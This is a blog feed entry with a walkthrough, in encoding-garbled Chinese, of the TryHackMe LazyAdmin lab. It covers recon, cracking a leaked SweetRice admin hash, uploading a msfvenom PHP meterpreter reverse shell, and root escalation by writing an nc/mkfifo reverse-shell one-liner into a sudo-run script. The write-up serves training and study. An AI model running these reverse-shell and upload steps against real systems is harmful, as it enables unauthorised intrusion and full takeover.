    <id>https://www.fomal.cc/posts/986850d6.html</id>
    <published>2024-10-01T05:21:11.000Z</published>
    <updated>2024-10-27T12:32:29.282Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.36.50</p><p>ÊîªÂáªÊú∫ipÔºö10.11.101.220</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap -sS -sV -sC 10.10.36.50 -o out.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 13:28:01 2024 as: nmap -sS -sV -sC -o out.txt 10.10.36.50</span><br><span class="line">Nmap scan report for 10.10.36.50</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)</span><br><span class="line">|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)</span><br><span class="line">|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 13:28:39 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds</span><br></pre></td></tr></table></figure><p>ÂèëÁé∞Âè™Êúâ 22Á´ØÂè£Âíå80Á´ØÂè£ÂºÄÊîæ</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001133324081-920118799.png" alt="image-20241001133315429"></p><p>80Á´ØÂè£ÊòØ‰∏Ä‰∏™apacheÂàùÂßãÈ°µÈù¢‰ªÄ‰πà‰πüÊ≤°ÊúâÔºåÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.36.50/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001134445161-1128622157.png" alt="image-20241001134437572"></p><p>ÂèëÁé∞<code>/content</code>Ë∑ØÁî±ÔºåËÆøÈóÆ‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140344879-280931777.png" alt="image-20241001140337721"></p><p>ÂèëÁé∞ÊòØ<code>SweetRice</code>Á´ôÁÇπÔºåÁªßÁª≠Êâ´ÊèèÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.36.50/content -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140558172-1591267814.png" alt="image-20241001140550777"></p><p>ËøôÂõûÂèëÁé∞‰∫Ü‰∏Ä‰∫õÊúâÊÑèÊÄùÁöÑÂÜÖÂÆπ</p><p>Âú®<code>/_themes</code>‰∏ãÔºåÂèëÁé∞‰∏Ä‰∫õÊü•Áúã‰∏ç‰∫ÜÊ∫êÁ†ÅÁöÑphpÊñá‰ª∂ÔºåÂπ∂Ê≤°Êúâ‰ªÄ‰πàÁî®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140738542-1427503327.png" alt="image-20241001140731314"></p><p>Âú®<code>/as</code>Ë∑ØÁî±‰∏ãÊâæÂà∞ÁôªÂΩïÂè£</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140820110-1638822951.png" alt="image-20241001140813239"></p><p><code>/attachment</code>Ë∑ØÁî±‰∏ãÂπ∂Ê≤°Êúâ‰ªÄ‰πà‰ø°ÊÅØ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140902177-336260211.png" alt="image-20241001140855448"></p><p>ËøôÈáåÁõ¥Êé•Áúã<code>/inc</code>Ë∑ØÁî±</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141015730-1826348733.png" alt="image-20241001141008810"></p><p>ÂæàÊòéÊòæÁúãÂà∞Êï∞ÊçÆÂ∫ìÂ§á‰ªΩÊñá‰ª∂Â§πÔºåÂ∞ÜÈáåÈù¢ÁöÑ<code>sql</code>Êñá‰ª∂‰∏ãËΩΩÂà∞Êú¨Âú∞Êü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141141471-910671197.png" alt="image-20241001141134169"></p><p>ÂèëÁé∞ËØ•cmsÁâàÊú¨‰∏∫1.5.1Ôºå‰∏îÂØÜÁ†Å‰πüÊúâÔºåÁî®Êà∑ÂêçÊòØ<code>manager</code>ÔºåÂ∞ùËØïhashcatÁ†¥Ëß£ÂØÜÁ†ÅÔºåÂ∞ÜÂØÜÁ†Å‰øùÂ≠ò‰∏∫<code>passwd</code></p><p><code>hashcat -a 0 -m 0 passwd /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141730815-751946977.png" alt="image-20241001141723708"></p><p>ÂèëÁé∞ÊàêÂäüÁ†¥Ëß£ÂØÜÁ†ÅÔºåÂØÜÁ†ÅÊòØ<code>Password123</code></p><p>Â∞ùËØïÈÄöËøá<code>as</code>Ë∑ØÁî±ÁôªÂΩï<code>manager</code>Ë¥¶Êà∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141932514-1784118097.png" alt="image-20241001141925338"></p><p>ÁôªÂΩïÊàêÂäüÔºåÂêåÊó∂ÂèØ‰ª•Á°ÆËÆ§ËØ•cmsÁâàÊú¨Âè∑‰∏∫1.5.1</p><h1>MSFËé∑ÂèñÊùÉÈôê</h1><p>ÂêØÂä®msfÔºå<code>search</code>‰∏Ä‰∏ãËØ•cmsÔºåÁúãÁúãËÉΩÂê¶ÊúâÂèØ‰ª•Áõ¥Êé•Âà©Áî®ÁöÑÊºèÊ¥û</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142416137-2123494996.png" alt="image-20241001142409002"></p><p>ÂæàÂèØÊÉúÔºåÊ≤°ÊúâÂèØ‰ª•Áõ¥Êé•Áî®ÁöÑÔºå‰ΩÜÊòØ<code>searchsploit</code>ÂèëÁé∞‰∫ÜÂèØ‰ª•Âà©Áî®ÁöÑÔºåÂÖ∂‰∏≠<code>Backup Disclosure</code>Êàë‰ª¨‰πãÂâçÊâãÂä®ÂÆûÁé∞‰∫ÜÔºåÂπ∂ÁôªÈôÜÂà∞‰∫ÜÂêéÂè∞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142447599-1728977571.png" alt="image-20241001142440531"></p><p>‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•Âà©Áî®ÂÖ∂‰ªñÁöÑÔºåÊØîÂ¶Ç<code>Arbitrary File Upload</code>ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáËøô‰∏™ÊºèÊ¥û‰∏ä‰º†shellÔºåËøôÈáå‰ΩøÁî®msfËøõË°åÂèçÂºπshell</p><p>ÂÖà‰ΩøÁî®msfÂàõÂª∫‰∏Ä‰∏™ÁõëÂê¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# ‰ΩøÁî® exploit/multi/handler Ê®°Âùó</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# ËÆæÁΩÆphpÁöÑÊîªÂáªË¥üËΩΩpayload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143752057-1728671297.png" alt="image-20241001143744773"></p><p>Â∞ÜÈúÄË¶ÅÁöÑÈÄâÈ°πÂ°´Â•Ω</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143817667-1736957141.png" alt="image-20241001143810923"></p><p>ËÆæÁΩÆÂ•ΩÁõëÂê¨Âô®ÂêéÔºåÁîüÊàêphpÂèçÂºπshell</p><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.101.220   lport=4444 R&gt;shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001144930162-200383647.png" alt="image-20241001144922924"></p><p>Âú®<code>http://10.10.36.50/content/as/?type=media_center</code>Â§ÑÔºåÂ∞ÜÊñá‰ª∂‰º†‰∏äÂéª</p><p>‰º†<code>.php</code>Êñá‰ª∂Êó∂ÔºåÂèëÁé∞Âπ∂Ê≤°ÊúâÂèçÂ∫îÔºåÂ∞ÜÊñá‰ª∂ÂêéÁºÄÊîπ‰∏∫<code>.phtml</code>ÔºåÊàêÂäü‰∏ä‰º†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001145344237-1734699769.png" alt="image-20241001145337432"></p><p>Âú®msf‰∏≠<code>run</code>ÊâßË°åÔºåÂú®ÁÇπÂáªÂΩìÂâçÈ°µÈù¢ÁöÑ<code>shell.phtml</code>Êñá‰ª∂ÔºåÊ≠§Êó∂ÂèëÁé∞shellÊàêÂäüÂºπÂõûÊù•‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150642271-505446254.png" alt="image-20241001150634947"></p><p>Êç¢Êàê‰∫§‰∫íÂºèshell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150826924-1862349482.png" alt="image-20241001150820149"></p><p>Âú®<code>/home/itguy</code>‰∏ãÊâæÂà∞<code>user.txt</code></p><h1>ÊùÉÈôêÊèêÂçá</h1><p>ËæìÂÖ•<code>sudo -l</code>Êü•ÁúãÊòØÂê¶ÊúâÂèØ‰ª•Âà©Áî®‰∫ÜÂëΩ‰ª§</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151250536-1508069797.png" alt="image-20241001151243232"></p><p>Âè™ÂèëÁé∞‰∫Ü‰∏ÄÊù°</p><p><code>(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl</code></p><p>Êü•Áúã‰∏Ä‰∏ã<code>backup.pl</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151400028-565050480.png" alt="image-20241001151353310"></p><p>ÂèëÁé∞Âè™ÊòØË∞ÉÁî®<code>/etc/copy.sh</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151602948-2027858445.png" alt="image-20241001151555700"></p><p>ÈÄöËøá‰ªîÁªÜÊü•Áúã‰∏§‰∏™Êñá‰ª∂ÂêéÂèëÁé∞ÔºåÊàë‰ª¨‰∏çËÉΩ‰øÆÊîπ<code>backup.pl</code>‰ΩÜÊòØÂèØ‰ª•Êîπ<code>/etc/copy.sh</code>Êñá‰ª∂ÁöÑÂÜÖÂÆπ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151800210-1044518594.png" alt="image-20241001151753242"></p><p>Êü•Áúã<code>/etc/copy.sh</code>Êñá‰ª∂ÂêéÂèëÁé∞ÔºåÂÜÖÂÆπÊòØÂèçÂºπshellÁöÑÂëΩ‰ª§ÔºåÂ∞ÜÂÖ∂‰øÆÊîπÊàêËá™Â∑±ÁöÑipÂíåport</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/copy.sh</code></p><p>Âè¶Ëµ∑‰∏Ä‰∏™ÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153450910-287086362.png" alt="image-20241001153444215"></p><p>Âú®msfÁªàÁ´ØshellÈáåÊâßË°åÂëΩ‰ª§</p><p><code>sudo /usr/bin/perl /home/itguy/backup.pl</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153547891-1980282670.png" alt="image-20241001153541191"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153900832-1299349622.png" alt="image-20241001153853757"></p><p>ÂèØ‰ª•ÁúãÂà∞Âú®Êñ∞ÁöÑshellÈáåËé∑Âæó‰∫ÜrootÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153956587-989090601.png" alt="image-20241001153949813"></p><p>ÊúÄÂêéÂú®<code>/root</code>‰∏ãÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãLazyAdmin</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
</feed>
